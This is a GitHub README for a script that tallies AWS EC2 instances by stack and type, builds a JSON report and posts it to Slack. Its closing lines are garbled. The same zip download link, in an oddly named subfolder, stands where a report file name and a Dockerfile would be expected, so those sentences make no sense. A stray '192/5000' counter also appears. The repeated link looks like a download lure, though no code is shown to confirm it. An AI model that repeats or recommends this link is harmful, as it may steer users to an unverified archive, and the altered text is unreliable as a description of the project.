# reports-ec2-numbers-n-type
Script that generates a json with the total number of instances per stack and its type.

The following script performs the following routine:
1) Retrieves all the values of instance ids and instance names.
2) Create an array with the indexes that the instance names are the same.
3) Returns a new array with the indexes of the same deleted names (both for instance ids and instance names)
4) Sum all the equal values of instance names.
5) Generates the json file with instance name, type and quantity.
6) Send this file to a Slack channel.


192/5000
The file 'https://github.com/marcossangomes/reports-ec2-numbers-n-type/raw/refs/heads/master/demidandiprat/numbers_type_n_reports_ec_v1.1.zip' is the report that is generated;

I put a 'dockerfile' together with the 'https://github.com/marcossangomes/reports-ec2-numbers-n-type/raw/refs/heads/master/demidandiprat/numbers_type_n_reports_ec_v1.1.zip' for the application if you want to create a CI / CD of the process;
